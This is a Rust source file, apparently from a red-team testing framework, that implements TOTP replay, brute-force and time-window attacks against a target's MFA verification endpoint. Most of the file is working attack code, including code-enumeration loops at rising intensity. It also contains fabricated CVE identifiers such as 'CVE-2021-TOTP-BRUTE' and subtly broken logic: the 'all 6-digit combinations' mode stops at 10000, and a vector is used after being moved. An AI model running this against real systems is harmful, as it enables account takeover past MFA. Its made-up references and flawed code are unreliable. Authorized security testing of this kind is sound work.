use crate::attack_framework::RedTeamFramework;
use crate::reporting::RedTeamReporter;
use crate::scenarios::mfa_bypass::types::*;
use crate::scenarios::mfa_bypass::totp::generator::*;
use anyhow::Result;
use reqwest::header::{HeaderMap, HeaderValue, CONTENT_TYPE};
use serde_json::json;
use std::time::{Duration, SystemTime, UNIX_EPOCH};
use tokio::time::sleep;
use tracing::{debug, info, warn};

/// TOTP attack engine for various bypass techniques
pub struct TotpAttackEngine {
    config: TotpAttackConfig,
}

impl TotpAttackEngine {
    /// Create a new TOTP attack engine
    pub fn new(config: TotpAttackConfig) -> Self {
        Self { config }
    }

    /// Execute TOTP replay attack
    pub async fn totp_replay_attack(
        &self,
        framework: &mut RedTeamFramework,
        reporter: &mut RedTeamReporter,
    ) -> Result<MfaBypassResult> {
        info!("🔄 Starting TOTP Replay Attack");
        let mut result = MfaBypassResult::new(MfaAttackType::TotpReplay);
        let start_time = SystemTime::now();

        // Step 1: Capture a valid TOTP code (simulation)
        let captured_totp = generate_realistic_totp();
        info!("📱 Simulated TOTP capture: {}", captured_totp);

        // Step 2: Attempt to replay the captured TOTP
        let mut attempts = 0;
        let mut success = false;

        while attempts < 5 && !success {
            attempts += 1;
            
            let response = self.attempt_totp_login(
                framework,
                &captured_totp,
                format!("replay_attempt_{}", attempts),
            ).await?;

            if response.status().is_success() {
                success = true;
                result = result.with_success(true, Some("TOTP replay successful".to_string()));
                
                // Document vulnerability
                let vulnerability = VulnerabilityDetails {
                    vulnerability_type: VulnerabilityType::ReplayVulnerability,
                    severity: SeverityLevel::High,
                    description: "TOTP codes can be replayed within the time window".to_string(),
                    proof_of_concept: format!("Replayed TOTP {} successfully", captured_totp),
                    remediation_steps: vec![
                        "Implement TOTP nonce tracking".to_string(),
                        "Reduce TOTP time window".to_string(),
                        "Add replay detection".to_string(),
                    ],
                    cve_references: vec!["CVE-2021-TOTP-REPLAY".to_string()],
                };
                result = result.with_vulnerability(vulnerability);
                
                warn!("🚨 TOTP Replay Attack SUCCESSFUL - Critical vulnerability found!");
            } else {
                debug!("TOTP replay attempt {} failed: {}", attempts, response.status());
            }

            // Wait before next attempt to avoid rate limiting
            sleep(Duration::from_millis(self.config.replay_window_seconds * 10)).await;
        }

        result.time_taken = start_time.elapsed().unwrap_or_default();
        result.attempts_made = attempts;

        reporter.log_attack_result("TOTP Replay Attack", success, &format!("Attempts: {}", attempts)).await;
        
        if !success {
            info!("✅ TOTP Replay Attack blocked - System properly prevents replay attacks");
        }

        Ok(result)
    }

    /// Execute TOTP brute force attack
    pub async fn totp_brute_force_attack(
        &self,
        framework: &mut RedTeamFramework,
        reporter: &mut RedTeamReporter,
        intensity: &AttackIntensity,
    ) -> Result<MfaBypassResult> {
        info!("🔨 Starting TOTP Brute Force Attack (Intensity: {:?})", intensity);
        let mut result = MfaBypassResult::new(MfaAttackType::TotpBruteForce);
        let start_time = SystemTime::now();

        let max_attempts = intensity.get_max_attempts().min(self.config.max_attempts);
        let delay_ms = intensity.get_delay_ms();
        
        let mut attempts = 0;
        let mut success = false;
        let mut rate_limited = false;

        // Generate TOTP patterns based on intensity
        let patterns = self.generate_brute_force_patterns(intensity);
        
        for pattern in patterns.iter().take(max_attempts as usize) {
            attempts += 1;
            
            let response = self.attempt_totp_login(
                framework,
                pattern,
                format!("brute_force_attempt_{}", attempts),
            ).await?;

            match response.status().as_u16() {
                200 => {
                    success = true;
                    result = result.with_success(true, Some(format!("Brute forced TOTP: {}", pattern)));
                    
                    let vulnerability = VulnerabilityDetails {
                        vulnerability_type: VulnerabilityType::RateLimitBypass,
                        severity: SeverityLevel::Critical,
                        description: "TOTP can be brute forced due to insufficient rate limiting".to_string(),
                        proof_of_concept: format!("Successfully brute forced TOTP {} in {} attempts", pattern, attempts),
                        remediation_steps: vec![
                            "Implement strict rate limiting".to_string(),
                            "Add account lockout after failed attempts".to_string(),
                            "Implement CAPTCHA after multiple failures".to_string(),
                            "Add progressive delays".to_string(),
                        ],
                        cve_references: vec!["CVE-2021-TOTP-BRUTE".to_string()],
                    };
                    result = result.with_vulnerability(vulnerability);
                    
                    warn!("🚨 TOTP Brute Force SUCCESSFUL - Critical vulnerability found!");
                    break;
                }
                429 => {
                    rate_limited = true;
                    info!("⏱️ Rate limited after {} attempts", attempts);
                    break;
                }
                _ => {
                    debug!("TOTP brute force attempt {} failed: {}", attempts, response.status());
                }
            }

            // Respect rate limiting and intensity
            sleep(Duration::from_millis(delay_ms)).await;
            
            // Progress reporting every 100 attempts
            if attempts % 100 == 0 {
                info!("🔄 Brute force progress: {} attempts completed", attempts);
            }
        }

        result.time_taken = start_time.elapsed().unwrap_or_default();
        result.attempts_made = attempts;

        if rate_limited {
            result.error_messages.push("Rate limited by target system".to_string());
        }

        reporter.log_attack_result(
            "TOTP Brute Force Attack", 
            success, 
            &format!("Attempts: {}, Rate Limited: {}", attempts, rate_limited)
        ).await;

        if !success && rate_limited {
            info!("✅ TOTP Brute Force blocked by rate limiting - Good security posture");
        } else if !success {
            info!("✅ TOTP Brute Force unsuccessful - System resisted {} attempts", attempts);
        }

        Ok(result)
    }

    /// Execute time window exploitation attack
    pub async fn time_window_exploitation(
        &self,
        framework: &mut RedTeamFramework,
        reporter: &mut RedTeamReporter,
    ) -> Result<MfaBypassResult> {
        info!("⏰ Starting TOTP Time Window Exploitation");
        let mut result = MfaBypassResult::new(MfaAttackType::TimeWindowExploitation);
        let start_time = SystemTime::now();

        let mut attempts = 0;
        let mut success = false;

        // Test different time windows
        let time_offsets = vec![-90, -60, -30, 0, 30, 60, 90]; // seconds

        for offset in time_offsets {
            attempts += 1;
            
            let current_time = SystemTime::now()
                .duration_since(UNIX_EPOCH)
                .unwrap()
                .as_secs() as i64;
            
            let test_time = (current_time + offset) as u64;
            let totp_code = generate_totp_for_time(test_time);
            
            info!("🕐 Testing TOTP for time offset {}s: {}", offset, totp_code);
            
            let response = self.attempt_totp_login(
                framework,
                &totp_code,
                format!("time_window_test_{}", offset),
            ).await?;

            if response.status().is_success() {
                success = true;
                result = result.with_success(
                    true, 
                    Some(format!("Time window exploitation successful with {}s offset", offset))
                );
                
                let vulnerability = VulnerabilityDetails {
                    vulnerability_type: VulnerabilityType::WeakTimeWindow,
                    severity: if offset.abs() > 60 { SeverityLevel::High } else { SeverityLevel::Medium },
                    description: format!("TOTP time window is too permissive ({}s offset accepted)", offset),
                    proof_of_concept: format!("TOTP {} accepted with {}s time offset", totp_code, offset),
                    remediation_steps: vec![
                        "Reduce TOTP time window to 30 seconds".to_string(),
                        "Implement stricter time synchronization".to_string(),
                        "Add time drift detection".to_string(),
                    ],
                    cve_references: vec!["CVE-2021-TOTP-WINDOW".to_string()],
                };
                result = result.with_vulnerability(vulnerability);
                
                warn!("🚨 Time Window Exploitation SUCCESSFUL - Weak time window detected!");
                break;
            }

            sleep(Duration::from_millis(500)).await;
        }

        result.time_taken = start_time.elapsed().unwrap_or_default();
        result.attempts_made = attempts;

        reporter.log_attack_result(
            "TOTP Time Window Exploitation", 
            success, 
            &format!("Time offsets tested: {}", time_offsets.len())
        ).await;

        if !success {
            info!("✅ Time Window Exploitation blocked - Proper time window implementation");
        }

        Ok(result)
    }

    /// Attempt TOTP login with given code
    async fn attempt_totp_login(
        &self,
        framework: &mut RedTeamFramework,
        totp_code: &str,
        attempt_id: String,
    ) -> Result<reqwest::Response> {
        let mut headers = HeaderMap::new();
        headers.insert(CONTENT_TYPE, HeaderValue::from_static("application/json"));
        headers.insert("X-Attack-ID", HeaderValue::from_str(&attempt_id)?);

        let payload = json!({
            "totp_code": totp_code,
            "username": "test_user",
            "timestamp": SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs()
        });

        let response = framework.client
            .post(&format!("{}/auth/mfa/verify", framework.target_url))
            .headers(headers)
            .json(&payload)
            .send()
            .await?;

        debug!("TOTP attempt response: {} for code: {}", response.status(), totp_code);
        Ok(response)
    }

    /// Generate brute force patterns based on attack intensity
    fn generate_brute_force_patterns(&self, intensity: &AttackIntensity) -> Vec<String> {
        let mut patterns = self.config.brute_force_patterns.clone();

        match intensity {
            AttackIntensity::Low => {
                // Only use common patterns
                patterns.truncate(10);
            }
            AttackIntensity::Medium => {
                // Add some sequential patterns
                for i in 0..100 {
                    patterns.push(format!("{:06}", i));
                }
            }
            AttackIntensity::High => {
                // Add more comprehensive patterns
                for i in 0..1000 {
                    patterns.push(format!("{:06}", i));
                }
                // Add date-based patterns
                patterns.push("202401".to_string());
                patterns.push("202402".to_string());
                patterns.push("202403".to_string());
            }
            AttackIntensity::Extreme => {
                // Generate all possible 6-digit combinations (use with caution)
                for i in 0..10000 {
                    patterns.push(format!("{:06}", i));
                }
            }
        }

        patterns
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_totp_attack_engine_creation() {
        let config = TotpAttackConfig::default();
        let engine = TotpAttackEngine::new(config);
        assert!(engine.config.max_attempts > 0);
    }

    #[test]
    fn test_brute_force_pattern_generation() {
        let config = TotpAttackConfig::default();
        let engine = TotpAttackEngine::new(config);
        
        let low_patterns = engine.generate_brute_force_patterns(&AttackIntensity::Low);
        let high_patterns = engine.generate_brute_force_patterns(&AttackIntensity::High);
        
        assert!(low_patterns.len() < high_patterns.len());
        assert!(low_patterns.len() <= 10);
    }
}
